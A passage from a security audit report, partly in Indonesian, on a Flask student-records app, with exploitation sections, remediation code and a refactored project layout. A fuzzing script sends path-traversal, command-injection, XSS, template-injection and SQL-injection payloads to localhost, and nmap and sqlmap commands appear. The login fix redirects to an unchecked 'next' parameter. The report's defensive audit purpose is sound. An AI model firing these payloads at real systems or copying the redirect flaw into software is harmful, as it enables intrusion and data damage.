# Inject special characters that may break UI/logic
special_inputs = [
    {'name': '\x00\x00\x00', 'age': 20, 'grade': 'A'},  # Null bytes
    {'name': '\n\n\n\n\n', 'age': 20, 'grade': 'A'},    # Newlines
    {'name': '😀😀😀', 'age': 20, 'grade': 'A'},        # Emojis
    {'name': '█▀▀▄', 'age': 20, 'grade': 'A'},          # Box drawing
    {'name': '../../etc/passwd', 'age': 20, 'grade': 'A'},  # Path traversal chars
    {'name': '<>&"\'', 'age': 20, 'grade': 'A'},       # HTML special chars
]

for data in special_inputs:
    requests.post('http://localhost:5000/add', data=data)
```

**Exploit 5: Whitespace Exploitation**

```python
# Whitespace-only names
data = {'name': '     ', 'age': 20, 'grade': 'A'}
requests.post('http://localhost:5000/add', data=data)

# Leading/trailing whitespace
data = {'name': '  John  ', 'age': 20, 'grade': ' A '}
requests.post('http://localhost:5000/add', data=data)

# Tab and newline characters
data = {'name': '\t\t\nJohn\n\t', 'age': 20, 'grade': 'A'}
requests.post('http://localhost:5000/add', data=data)
```

**Automated Fuzzing Script:**

```python
import requests
import string
import random

class InputFuzzer:
    def __init__(self, target_url):
        self.target_url = target_url

    def generate_long_string(self, length):
        """Generate very long string"""
        return 'A' * length

    def generate_special_chars(self):
        """Generate string with special characters"""
        return ''.join(chr(i) for i in range(0, 128))

    def generate_unicode(self):
        """Generate various unicode characters"""
        return ''.join(chr(i) for i in range(0x1F600, 0x1F650))  # Emojis

    def fuzz_name_field(self):
        """Fuzz the name field"""
        test_cases = [
            '',                                    # Empty
            ' ',                                   # Single space
            '     ',                               # Multiple spaces
            self.generate_long_string(10000),      # Very long
            self.generate_long_string(100000),     # Extremely long
            self.generate_special_chars(),         # Special chars
            self.generate_unicode(),               # Unicode/Emojis
            '\x00' * 100,                          # Null bytes
            '../../../etc/passwd',                 # Path traversal
            '${IFS}cat${IFS}/etc/passwd',          # Command injection attempt
            '{{7*7}}',                             # Template injection
            '<img src=x onerror=alert(1)>',        # XSS
            "'; DROP TABLE student;--",            # SQLi
        ]

        for i, name in enumerate(test_cases):
            print(f"[*] Testing name case {i+1}/{len(test_cases)}")
            try:
                response = requests.post(f'{self.target_url}/add', data={
                    'name': name,
                    'age': 20,
                    'grade': 'A'
                }, timeout=5)

                if response.status_code == 500:
                    print(f"[!] Server error with input: {repr(name)[:50]}")
                elif response.status_code == 200:
                    print(f"[+] Input accepted (potential vulnerability): {repr(name)[:50]}")
            except Exception as e:
                print(f"[!] Exception with input: {repr(name)[:50]} - {e}")

    def fuzz_age_field(self):
        """Fuzz the age field"""
        test_cases = [
            -1,
            -999999,
            0,
            256,
            65536,
            999999999,
            'abc',
            '1.5',
            '1e10',
            '0x10',
            'null',
            '',
        ]

        for age in test_cases:
            print(f"[*] Testing age: {age}")
            try:
                response = requests.post(f'{self.target_url}/add', data={
                    'name': 'Test',
                    'age': age,
                    'grade': 'A'
                }, timeout=5)

                if response.status_code == 500:
                    print(f"[!] Server error with age: {age}")
                elif response.status_code == 200:
                    print(f"[+] Age accepted: {age}")
            except Exception as e:
                print(f"[!] Exception with age: {age} - {e}")

    def fuzz_grade_field(self):
        """Fuzz the grade field"""
        test_cases = [
            '',
            'Z',
            'G',
            'a',  # lowercase
            'A+++++',
            '100',
            'Pass',
            'Fail',
            self.generate_long_string(1000),
            '\x00',
        ]

        for grade in test_cases:
            print(f"[*] Testing grade: {repr(grade)[:30]}")
            response = requests.post(f'{self.target_url}/add', data={
                'name': 'Test',
                'age': 20,
                'grade': grade
            })

            if response.status_code == 200:
                print(f"[+] Grade accepted: {repr(grade)[:30]}")

    def run_all_tests(self):
        """Run all fuzzing tests"""
        print("[*] Starting name field fuzzing...")
        self.fuzz_name_field()

        print("\n[*] Starting age field fuzzing...")
        self.fuzz_age_field()

        print("\n[*] Starting grade field fuzzing...")
        self.fuzz_grade_field()

# Usage
fuzzer = InputFuzzer('http://localhost:5000')
fuzzer.run_all_tests()
```

---

#### **C. Dampak dari Kerentanan**

**Dampak Teknis:**
1. **Data Integrity Issues:**
   - Invalid data stored in database
   - Age values that don't make sense (negative, too large)
   - Grade formats that are meaningless
   - Corrupted or malformed data

2. **Application Errors:**
   - SQL errors from invalid data types
   - Memory issues from extremely long strings
   - Rendering issues in UI
   - Logic errors in calculations

3. **Denial of Service:**
   - Database bloat from long strings
   - Slow queries due to large data
   - Memory exhaustion
   - CPU exhaustion from processing invalid data

4. **Security Bypass:**
   - Can be combined with other vulnerabilities (XSS, SQLi)
   - Input validation is first line of defense

5. **Business Logic Errors:**
   - Reports with invalid data
   - Statistics that are meaningless
   - Sorting/filtering that doesn't work correctly

**Dampak Bisnis:**
1. **Data Quality Issues:**
   - Unreliable database
   - Invalid records
   - Cannot trust data for decisions

2. **User Experience Problems:**
   - UI breaks with invalid data
   - Confusing or misleading information
   - Application errors

3. **Operational Issues:**
   - Time spent cleaning invalid data
   - Support tickets from users
   - Need for data migration/cleanup

4. **Compliance Problems:**
   - Data quality requirements not met
   - Audit failures
   - Regulatory issues

**Examples of Problems:**
```python
# User adds student with age = -5
# Report shows: "Average student age: -5 years"
# Clearly invalid and makes organization look unprofessional

# User adds name with 100,000 characters
# Database becomes bloated
# UI takes forever to render
# Export features time out

# User adds grade = "ZZZZZ"
# Grade statistics are meaningless
# GPA calculations fail
# Report generation breaks
```

**Severity: MEDIUM** (CVSS Score: 5.3)
- Does not directly compromise security
- But enables other attacks
- Causes data integrity issues
- Can lead to DOS

---

#### **D. Rekomendasi Perbaikan**

**1. Implementasi Server-Side Validation dengan WTForms**

```python
from flask_wtf import FlaskForm
from wtforms import StringField, IntegerField, SelectField, SubmitField
from wtforms.validators import (
    DataRequired, Length, NumberRange, Regexp, ValidationError
)

class StudentForm(FlaskForm):
    """Form with comprehensive validation"""

    name = StringField('Name', validators=[
        DataRequired(message='Name is required'),
        Length(min=1, max=100, message='Name must be 1-100 characters'),
        Regexp(
            r'^[a-zA-Z\s\'-]+$',
            message='Name can only contain letters, spaces, hyphens and apostrophes'
        )
    ])

    age = IntegerField('Age', validators=[
        DataRequired(message='Age is required'),
        NumberRange(min=1, max=150, message='Age must be between 1 and 150')
    ])

    grade = SelectField('Grade',
        choices=[
            ('A+', 'A+'), ('A', 'A'), ('A-', 'A-'),
            ('B+', 'B+'), ('B', 'B'), ('B-', 'B-'),
            ('C+', 'C+'), ('C', 'C'), ('C-', 'C-'),
            ('D+', 'D+'), ('D', 'D'), ('D-', 'D-'),
            ('F', 'F')
        ],
        validators=[DataRequired(message='Grade is required')]
    )

    submit = SubmitField('Submit')

    def validate_name(self, field):
        """Custom validator for name"""
        # Remove extra whitespace
        field.data = ' '.join(field.data.split())

        # Check for only whitespace
        if not field.data.strip():
            raise ValidationError('Name cannot be only whitespace')

        # Check for too many consecutive spaces
        if '  ' in field.data:
            raise ValidationError('Name cannot contain multiple consecutive spaces')

# Use in routes
@app.route('/add', methods=['GET', 'POST'])
def add_student():
    form = StudentForm()

    if form.validate_on_submit():
        new_student = Student(
            name=form.name.data,
            age=form.age.data,
            grade=form.grade.data
        )
        db.session.add(new_student)
        db.session.commit()

        flash('Student added successfully', 'success')
        return redirect(url_for('index'))

    # Show validation errors
    if form.errors:
        for field, errors in form.errors.items():
            for error in errors:
                flash(f'{field}: {error}', 'error')

    return render_template('add.html', form=form)
```

**2. Custom Validation Functions**

```python
import re
from typing import Tuple, Optional

def validate_student_name(name: str) -> Tuple[bool, Optional[str]]:
    """
    Validate student name
    Returns: (is_valid, error_message)
    """
    # Check if empty
    if not name:
        return False, "Name is required"

    # Strip whitespace
    name = name.strip()

    # Check length
    if len(name) < 1:
        return False, "Name is too short"
    if len(name) > 100:
        return False, "Name is too long (max 100 characters)"

    # Check for only whitespace
    if not name or name.isspace():
        return False, "Name cannot be only whitespace"

    # Check character set
    if not re.match(r'^[a-zA-Z\s\'-]+$', name):
        return False, "Name contains invalid characters"

    # Check for multiple consecutive spaces
    if '  ' in name:
        return False, "Name cannot contain multiple consecutive spaces"

    # Check for leading/trailing special characters
    if name[0] in ['-', "'"] or name[-1] in ['-', "'"]:
        return False, "Name cannot start or end with special characters"

    return True, None

def validate_student_age(age) -> Tuple[bool, Optional[str]]:
    """Validate student age"""
    # Check type
    try:
        age_int = int(age)
    except (ValueError, TypeError):
        return False, "Age must be a number"

    # Check range
    if age_int < 1:
        return False, "Age must be positive"
    if age_int > 150:
        return False, "Age must be 150 or less"

    return True, None

def validate_student_grade(grade: str) -> Tuple[bool, Optional[str]]:
    """Validate student grade"""
    valid_grades = [
        'A+', 'A', 'A-',
        'B+', 'B', 'B-',
        'C+', 'C', 'C-',
        'D+', 'D', 'D-',
        'F'
    ]

    if not grade:
        return False, "Grade is required"

    grade = grade.strip().upper()

    if grade not in valid_grades:
        return False, f"Invalid grade. Must be one of: {', '.join(valid_grades)}"

    return True, None

# Use in routes
@app.route('/add', methods=['POST'])
def add_student():
    # Get and validate input
    name = request.form.get('name', '')
    age = request.form.get('age', '')
    grade = request.form.get('grade', '')

    # Validate name
    valid, error = validate_student_name(name)
    if not valid:
        return {'error': error}, 400

    # Validate age
    valid, error = validate_student_age(age)
    if not valid:
        return {'error': error}, 400

    # Validate grade
    valid, error = validate_student_grade(grade)
    if not valid:
        return {'error': error}, 400

    # All valid, proceed
    new_student = Student(
        name=name.strip(),
        age=int(age),
        grade=grade.strip().upper()
    )
    db.session.add(new_student)
    db.session.commit()

    return redirect(url_for('index'))
```

**3. Client-Side Validation (Defense in Depth)**

```html
<!-- templates/index.html -->
<form action="/add" method="POST" id="studentForm">
    <input
        type="text"
        name="name"
        placeholder="Name"
        required
        minlength="1"
        maxlength="100"
        pattern="[a-zA-Z\s\'-]+"
        title="Name can only contain letters, spaces, hyphens and apostrophes"
    >

    <input
        type="number"
        name="age"
        placeholder="Age"
        required
        min="1"
        max="150"
        step="1"
    >

    <select name="grade" required>
        <option value="">Select Grade</option>
        <option value="A+">A+</option>
        <option value="A">A</option>
        <option value="A-">A-</option>
        <option value="B+">B+</option>
        <option value="B">B</option>
        <option value="B-">B-</option>
        <option value="C+">C+</option>
        <option value="C">C</option>
        <option value="C-">C-</option>
        <option value="D+">D+</option>
        <option value="D">D</option>
        <option value="D-">D-</option>
        <option value="F">F</option>
    </select>

    <button type="submit" class="btn btn-primary">Add Student</button>
</form>

<script>
// Additional JavaScript validation
document.getElementById('studentForm').addEventListener('submit', function(e) {
    const name = document.querySelector('input[name="name"]').value.trim();
    const age = parseInt(document.querySelector('input[name="age"]').value);
    const grade = document.querySelector('select[name="grade"]').value;

    // Validate name
    if (!name || name.length < 1 || name.length > 100) {
        alert('Name must be 1-100 characters');
        e.preventDefault();
        return;
    }

    if (!/^[a-zA-Z\s\'-]+$/.test(name)) {
        alert('Name contains invalid characters');
        e.preventDefault();
        return;
    }

    // Validate age
    if (isNaN(age) || age < 1 || age > 150) {
        alert('Age must be between 1 and 150');
        e.preventDefault();
        return;
    }

    // Validate grade
    const validGrades = ['A+', 'A', 'A-', 'B+', 'B', 'B-', 'C+', 'C', 'C-', 'D+', 'D', 'D-', 'F'];
    if (!validGrades.includes(grade)) {
        alert('Please select a valid grade');
        e.preventDefault();
        return;
    }
});
</script>
```

**4. Database Constraints**

```python
# Add database-level constraints
class Student(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(
        db.String(100),
        nullable=False,
        index=True
    )
    age = db.Column(
        db.Integer,
        nullable=False,
        # Add check constraint
        info={'check': 'age >= 1 AND age <= 150'}
    )
    grade = db.Column(
        db.String(10),
        nullable=False
    )

    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    __table_args__ = (
        db.CheckConstraint('age >= 1 AND age <= 150', name='check_age_range'),
        db.CheckConstraint("LENGTH(name) >= 1 AND LENGTH(name) <= 100", name='check_name_length'),
    )

    def __repr__(self):
        return f'<Student {self.name}>'
```

**5. Input Sanitization**

```python
import html
import bleach

def sanitize_input(text: str, max_length: int = 100) -> str:
    """Sanitize user input"""
    if not text:
        return ''

    # Convert to string
    text = str(text)

    # Remove leading/trailing whitespace
    text = text.strip()

    # Normalize whitespace (replace multiple spaces with single space)
    text = ' '.join(text.split())

    # Truncate to max length
    text = text[:max_length]

    # HTML escape
    text = html.escape(text)

    # Or use bleach for more control
    # text = bleach.clean(text, tags=[], attributes={}, strip=True)

    return text

@app.route('/add', methods=['POST'])
def add_student():
    # Sanitize inputs
    name = sanitize_input(request.form.get('name', ''), max_length=100)
    age = request.form.get('age', '')
    grade = sanitize_input(request.form.get('grade', ''), max_length=10)

    # Validate
    # ... validation code ...

    # Use sanitized values
    new_student = Student(name=name, age=int(age), grade=grade.upper())
    db.session.add(new_student)
    db.session.commit()
```

**6. Error Messages**

```python
from flask import flash, render_template

@app.route('/add', methods=['GET', 'POST'])
def add_student():
    if request.method == 'POST':
        errors = []

        # Validate each field
        name = request.form.get('name', '')
        valid, error = validate_student_name(name)
        if not valid:
            errors.append(error)

        age = request.form.get('age', '')
        valid, error = validate_student_age(age)
        if not valid:
            errors.append(error)

        grade = request.form.get('grade', '')
        valid, error = validate_student_grade(grade)
        if not valid:
            errors.append(error)

        # If there are errors, show them
        if errors:
            for error in errors:
                flash(error, 'danger')
            return render_template('add.html',
                                 name=name,
                                 age=age,
                                 grade=grade)

        # All valid, proceed
        new_student = Student(
            name=name.strip(),
            age=int(age),
            grade=grade.strip().upper()
        )
        db.session.add(new_student)
        db.session.commit()

        flash('Student added successfully!', 'success')
        return redirect(url_for('index'))

    return render_template('add.html')
```

**Priority: MEDIUM - Should be implemented before production**

---

---

### **KERENTANAN 8: Binding to All Network Interfaces (0.0.0.0)**

#### **A. Deskripsi Kerentanan**
Aplikasi menggunakan `host='0.0.0.0'` yang membuat aplikasi accessible dari semua network interfaces, termasuk external networks dan internet.

**Lokasi:**
- `app.py:80` - `app.run(host='0.0.0.0', port=5000, debug=True)`

**Dampak:**
- Aplikasi vulnerable dapat diakses dari internet
- Increases attack surface significantly
- Exposes internal application to external attackers

---

#### **B. Cara Eksploitasi**

**Skenario 1: Internet Exposure**
```bash
# Attacker scans IP ranges for open port 5000
nmap -p 5000 --open 192.168.0.0/24

# Finds exposed application
# Can now exploit all vulnerabilities remotely
```

**Skenario 2: Local Network Attack**
```bash
# Attacker on same network
# Discovers application via network scan
# Exploits from any device on network
```

---

#### **C. Dampak dari Kerentanan**

**Dampak:**
- All vulnerabilities become remotely exploitable
- Increased attack surface
- No network-level protection
- Can be attacked from anywhere

**Severity: MEDIUM** (CVSS Score: 5.3)
- Amplifies other vulnerabilities
- Makes application remotely accessible

---

#### **D. Rekomendasi Perbaikan**

**1. Bind to Localhost Only (Development)**

```python
# SEBELUM (Vulnerable):
app.run(host='0.0.0.0', port=5000, debug=True)

# SESUDAH (Secure):
app.run(host='127.0.0.1', port=5000, debug=False)
```

**2. Use Reverse Proxy in Production**

```nginx
# nginx.conf
server {
    listen 80;
    server_name yourdomain.com;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

**3. Firewall Rules**

```bash
# Only allow localhost
sudo ufw allow from 127.0.0.1 to any port 5000

# Or specific IP ranges
sudo ufw allow from 192.168.1.0/24 to any port 5000
```

**Priority: MEDIUM - Important for production security**

---

---

## Ringkasan Kerentanan

| # | Kerentanan | Severity | CVSS | Priority |
|---|------------|----------|------|----------|
| 1 | No Authentication/Authorization | CRITICAL | 9.1 | IMMEDIATE |
| 2 | Stored Cross-Site Scripting (XSS) | HIGH | 8.2 | HIGH |
| 3 | SQL Injection (Multiple Locations) | CRITICAL | 9.8 | IMMEDIATE |
| 4 | Cross-Site Request Forgery (CSRF) | MEDIUM-HIGH | 6.5 | HIGH |
| 5 | Insecure Direct Object Reference (IDOR) | HIGH | 7.5 | HIGH |
| 6 | Debug Mode in Production | CRITICAL | 10.0 | IMMEDIATE |
| 7 | Missing Input Validation | MEDIUM | 5.3 | MEDIUM |
| 8 | Binding to All Network Interfaces | MEDIUM | 5.3 | MEDIUM |

---

## Rekomendasi Prioritas Perbaikan

### Phase 1: CRITICAL (Immediate - Week 1)
1. Disable debug mode
2. Fix all SQL Injection vulnerabilities
3. Implement authentication system

### Phase 2: HIGH (Week 2-3)
4. Fix XSS vulnerabilities
5. Implement CSRF protection
6. Fix IDOR vulnerabilities

### Phase 3: MEDIUM (Week 4)
7. Add comprehensive input validation
8. Change network binding configuration
9. Implement security headers
10. Add rate limiting

---

## Tools untuk Testing

```bash
# SQL Injection
sqlmap -u "http://localhost:5000/edit/1" --forms --batch

# XSS
python3 xsstrike.py -u "http://localhost:5000"

# General vulnerability scanner
nikto -h http://localhost:5000

# OWASP ZAP
zap-cli quick-scan -s all http://localhost:5000
```

---

## Struktur Proyek yang Direkomendasikan

### Overview

Saat ini, semua kode berada dalam satu file `app.py`. Untuk aplikasi yang lebih maintainable dan secure, kita perlu memisahkan kode ke dalam multiple files berdasarkan fungsinya (separation of concerns).

---

### Struktur Folder Lengkap

```
python-sqlite/
│
├── instance/
│   └── students.db              # Database file (auto-generated)
│
├── app/
│   ├── __init__.py              # Application factory
│   ├── models.py                # Database models
│   ├── forms.py                 # WTForms validation
│   ├── auth.py                  # Authentication routes & logic
│   ├── students.py              # Student management routes
│   ├── decorators.py            # Custom decorators (admin_required, etc.)
│   ├── validators.py            # Custom validation functions
│   ├── security.py              # Security utilities (sanitization, etc.)
│   │
│   ├── templates/
│   │   ├── base.html            # Base template
│   │   ├── index.html           # Student list
│   │   ├── add.html             # Add student form
│   │   ├── edit.html            # Edit student form
│   │   ├── login.html           # Login page
│   │   ├── register.html        # Register page
│   │   └── errors/
│   │       ├── 403.html         # Forbidden error
│   │       ├── 404.html         # Not found error
│   │       └── 500.html         # Server error
│   │
│   └── static/
│       ├── css/
│       │   └── style.css        # Custom styles
│       └── js/
│           └── main.js          # Custom JavaScript
│
├── migrations/                   # Database migrations (Flask-Migrate)
│
├── tests/
│   ├── __init__.py
│   ├── test_auth.py             # Authentication tests
│   ├── test_students.py         # Student CRUD tests
│   └── test_security.py         # Security tests
│
├── config.py                     # Configuration classes
├── requirements.txt              # Python dependencies
├── .env.example                  # Environment variables template
├── .env                          # Actual environment variables (NOT in git)
├── .gitignore                    # Git ignore file
├── run.py                        # Application entry point
└── wsgi.py                       # WSGI entry point for production
```

---

### File-by-File Implementation

#### 1. `config.py` - Configuration Management

```python
import os
import secrets
from dotenv import load_dotenv

basedir = os.path.abspath(os.path.dirname(__file__))
load_dotenv(os.path.join(basedir, '.env'))

class Config:
    """Base configuration"""
    SECRET_KEY = os.environ.get('SECRET_KEY') or secrets.token_hex(32)
    SQLALCHEMY_DATABASE_URI = os.environ.get('DATABASE_URL') or \
        'sqlite:///' + os.path.join(basedir, 'instance', 'students.db')
    SQLALCHEMY_TRACK_MODIFICATIONS = False

    # Security settings
    SESSION_COOKIE_SECURE = False  # Set True in production with HTTPS
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Lax'
    PERMANENT_SESSION_LIFETIME = 1800  # 30 minutes

    # CSRF Protection
    WTF_CSRF_ENABLED = True
    WTF_CSRF_TIME_LIMIT = None  # No time limit

    # Rate limiting
    RATELIMIT_STORAGE_URL = 'memory://'

class DevelopmentConfig(Config):
    """Development configuration"""
    DEBUG = True
    TESTING = False
    SESSION_COOKIE_SECURE = False

class ProductionConfig(Config):
    """Production configuration"""
    DEBUG = False
    TESTING = False
    SESSION_COOKIE_SECURE = True

    # Ensure required environment variables
    @classmethod
    def init_app(cls, app):
        if not os.environ.get('SECRET_KEY'):
            raise ValueError("SECRET_KEY must be set in production")

class TestingConfig(Config):
    """Testing configuration"""
    TESTING = True
    SQLALCHEMY_DATABASE_URI = 'sqlite:///:memory:'
    WTF_CSRF_ENABLED = False

config = {
    'development': DevelopmentConfig,
    'production': ProductionConfig,
    'testing': TestingConfig,
    'default': DevelopmentConfig
}
```

---

#### 2. `app/__init__.py` - Application Factory

```python
from flask import Flask
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager
from flask_wtf.csrf import CSRFProtect
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from config import config
import logging
from logging.handlers import RotatingFileHandler
import os

# Initialize extensions (without app)
db = SQLAlchemy()
login_manager = LoginManager()
csrf = CSRFProtect()
limiter = Limiter(key_func=get_remote_address)

def create_app(config_name='default'):
    """Application factory function"""
    app = Flask(__name__)

    # Load configuration
    app.config.from_object(config[config_name])

    # Initialize extensions with app
    db.init_app(app)
    login_manager.init_app(app)
    csrf.init_app(app)
    limiter.init_app(app)

    # Configure login manager
    login_manager.login_view = 'auth.login'
    login_manager.login_message = 'Please log in to access this page.'

    # Register blueprints
    from app.auth import auth_bp
    from app.students import students_bp

    app.register_blueprint(auth_bp)
    app.register_blueprint(students_bp)

    # Register error handlers
    register_error_handlers(app)

    # Register security headers
    register_security_headers(app)

    # Setup logging
    setup_logging(app)

    # Create database tables
    with app.app_context():
        db.create_all()

    return app

def register_error_handlers(app):
    """Register custom error handlers"""
    from flask import render_template

    @app.errorhandler(403)
    def forbidden(error):
        return render_template('errors/403.html'), 403

    @app.errorhandler(404)
    def not_found(error):
        return render_template('errors/404.html'), 404

    @app.errorhandler(500)
    def internal_error(error):
        db.session.rollback()
        app.logger.error(f'Server Error: {error}', exc_info=True)
        return render_template('errors/500.html'), 500

def register_security_headers(app):
    """Register security headers"""
    @app.after_request
    def set_security_headers(response):
        # Content Security Policy
        response.headers['Content-Security-Policy'] = (
            "default-src 'self'; "
            "script-src 'self' https://stackpath.bootstrapcdn.com; "
            "style-src 'self' https://stackpath.bootstrapcdn.com 'unsafe-inline'; "
            "img-src 'self' data:; "
            "font-src 'self' https://stackpath.bootstrapcdn.com;"
        )

        # Other security headers
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-Frame-Options'] = 'DENY'
        response.headers['X-XSS-Protection'] = '1; mode=block'
        response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'

        return response

def setup_logging(app):
    """Setup application logging"""
    if not app.debug and not app.testing:
        if not os.path.exists('logs'):
            os.mkdir('logs')

        file_handler = RotatingFileHandler(
            'logs/app.log',
            maxBytes=10240000,
            backupCount=10
        )
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]'
        ))
        file_handler.setLevel(logging.INFO)
        app.logger.addHandler(file_handler)

        app.logger.setLevel(logging.INFO)
        app.logger.info('Application startup')

@login_manager.user_loader
def load_user(user_id):
    """Load user for Flask-Login"""
    from app.models import User
    return User.query.get(int(user_id))
```

---

#### 3. `app/models.py` - Database Models

```python
from app import db
from flask_login import UserMixin
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime
import uuid

class User(UserMixin, db.Model):
    """User model for authentication"""
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64), unique=True, nullable=False, index=True)
    email = db.Column(db.String(120), unique=True, nullable=False, index=True)
    password_hash = db.Column(db.String(200), nullable=False)
    role = db.Column(db.String(20), default='user')  # user, teacher, admin

    # Relationships
    students = db.relationship('Student', backref='owner', lazy='dynamic')

    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime)

    def set_password(self, password):
        """Hash and set password"""
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        """Check password against hash"""
        return check_password_hash(self.password_hash, password)

    def is_admin(self):
        """Check if user is admin"""
        return self.role == 'admin'

    def __repr__(self):
        return f'<User {self.username}>'

class Student(db.Model):
    """Student model"""
    # Use UUID instead of sequential ID
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    name = db.Column(db.String(100), nullable=False, index=True)
    age = db.Column(db.Integer, nullable=False)
    grade = db.Column(db.String(10), nullable=False)

    # Foreign key to user
    owner_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)

    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    # Database constraints
    __table_args__ = (
        db.CheckConstraint('age >= 1 AND age <= 150', name='check_age_range'),
        db.CheckConstraint('LENGTH(name) >= 1 AND LENGTH(name) <= 100', name='check_name_length'),
    )

    def can_access(self, user):
        """Check if user can access this student"""
        return user.is_admin() or self.owner_id == user.id

    def can_modify(self, user):
        """Check if user can modify this student"""
        return user.is_admin() or self.owner_id == user.id

    def can_delete(self, user):
        """Check if user can delete this student"""
        return user.is_admin() or self.owner_id == user.id

    def __repr__(self):
        return f'<Student {self.name}>'

class AuditLog(db.Model):
    """Audit log for tracking actions"""
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    action = db.Column(db.String(50), nullable=False)  # CREATE, UPDATE, DELETE, LOGIN, etc.
    resource_type = db.Column(db.String(50))  # Student, User, etc.
    resource_id = db.Column(db.String(50))
    details = db.Column(db.Text)
    ip_address = db.Column(db.String(45))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow, index=True)

    def __repr__(self):
        return f'<AuditLog {self.action} by User {self.user_id}>'
```

---

#### 4. `app/forms.py` - WTForms Validation

```python
from flask_wtf import FlaskForm
from wtforms import StringField, IntegerField, SelectField, PasswordField, SubmitField
from wtforms.validators import (
    DataRequired, Length, NumberRange, Email, EqualTo, ValidationError, Regexp
)
from app.models import User

class LoginForm(FlaskForm):
    """Login form"""
    username = StringField('Username', validators=[
        DataRequired(),
        Length(min=3, max=64)
    ])
    password = PasswordField('Password', validators=[
        DataRequired()
    ])
    submit = SubmitField('Login')

class RegistrationForm(FlaskForm):
    """Registration form"""
    username = StringField('Username', validators=[
        DataRequired(),
        Length(min=3, max=64),
        Regexp(r'^[a-zA-Z0-9_]+$', message='Username can only contain letters, numbers, and underscores')
    ])
    email = StringField('Email', validators=[
        DataRequired(),
        Email(),
        Length(max=120)
    ])
    password = PasswordField('Password', validators=[
        DataRequired(),
        Length(min=8, message='Password must be at least 8 characters')
    ])
    password2 = PasswordField('Confirm Password', validators=[
        DataRequired(),
        EqualTo('password', message='Passwords must match')
    ])
    submit = SubmitField('Register')

    def validate_username(self, username):
        """Check if username already exists"""
        user = User.query.filter_by(username=username.data).first()
        if user:
            raise ValidationError('Username already taken. Please choose a different one.')

    def validate_email(self, email):
        """Check if email already exists"""
        user = User.query.filter_by(email=email.data).first()
        if user:
            raise ValidationError('Email already registered. Please use a different one.')

class StudentForm(FlaskForm):
    """Student form with validation"""
    name = StringField('Name', validators=[
        DataRequired(message='Name is required'),
        Length(min=1, max=100, message='Name must be 1-100 characters'),
        Regexp(
            r'^[a-zA-Z\s\'-]+$',
            message='Name can only contain letters, spaces, hyphens and apostrophes'
        )
    ])

    age = IntegerField('Age', validators=[
        DataRequired(message='Age is required'),
        NumberRange(min=1, max=150, message='Age must be between 1 and 150')
    ])

    grade = SelectField('Grade',
        choices=[
            ('', 'Select Grade'),
            ('A+', 'A+'), ('A', 'A'), ('A-', 'A-'),
            ('B+', 'B+'), ('B', 'B'), ('B-', 'B-'),
            ('C+', 'C+'), ('C', 'C'), ('C-', 'C-'),
            ('D+', 'D+'), ('D', 'D'), ('D-', 'D-'),
            ('F', 'F')
        ],
        validators=[
            DataRequired(message='Grade is required')
        ]
    )

    submit = SubmitField('Submit')

    def validate_name(self, field):
        """Custom name validation"""
        # Normalize whitespace
        field.data = ' '.join(field.data.split())

        if not field.data.strip():
            raise ValidationError('Name cannot be only whitespace')
```

---

#### 5. `app/auth.py` - Authentication Routes

```python
from flask import Blueprint, render_template, redirect, url_for, flash, request
from flask_login import login_user, logout_user, login_required, current_user
from app import db, limiter
from app.models import User, AuditLog
from app.forms import LoginForm, RegistrationForm
from datetime import datetime

auth_bp = Blueprint('auth', __name__, url_prefix='/auth')

@auth_bp.route('/login', methods=['GET', 'POST'])
@limiter.limit("5 per minute")  # Rate limiting
def login():
    """Login route"""
    if current_user.is_authenticated:
        return redirect(url_for('students.index'))

    form = LoginForm()

    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()

        if user and user.check_password(form.password.data):
            login_user(user)
            user.last_login = datetime.utcnow()

            # Log login
            log = AuditLog(
                user_id=user.id,
                action='LOGIN',
                ip_address=request.remote_addr
            )
            db.session.add(log)
            db.session.commit()

            flash('Login successful!', 'success')

            # Redirect to next page or index
            next_page = request.args.get('next')
            return redirect(next_page) if next_page else redirect(url_for('students.index'))
        else:
            flash('Invalid username or password', 'danger')

            # Log failed login attempt
            if user:
                log = AuditLog(
                    user_id=user.id,
                    action='FAILED_LOGIN',
                    ip_address=request.remote_addr
                )
                db.session.add(log)
                db.session.commit()

    return render_template('login.html', form=form)

@auth_bp.route('/logout')
@login_required
def logout():
    """Logout route"""
    # Log logout
    log = AuditLog(
        user_id=current_user.id,
        action='LOGOUT',
        ip_address=request.remote_addr
    )
    db.session.add(log)
    db.session.commit()

    logout_user()
    flash('You have been logged out.', 'info')
    return redirect(url_for('auth.login'))

@auth_bp.route('/register', methods=['GET', 'POST'])
def register():
    """Registration route"""
    if current_user.is_authenticated:
        return redirect(url_for('students.index'))

    form = RegistrationForm()

    if form.validate_on_submit():
        user = User(
            username=form.username.data,
            email=form.email.data
        )
        user.set_password(form.password.data)

        db.session.add(user)
        db.session.commit()

        flash('Registration successful! Please log in.', 'success')
        return redirect(url_for('auth.login'))

    return render_template('register.html', form=form)
```

---

#### 6. `app/students.py` - Student Management Routes

```python
from flask import Blueprint, render_template, redirect, url_for, flash, abort, request
from flask_login import login_required, current_user
from app import db
from app.models import Student, AuditLog
from app.forms import StudentForm
from app.decorators import admin_required
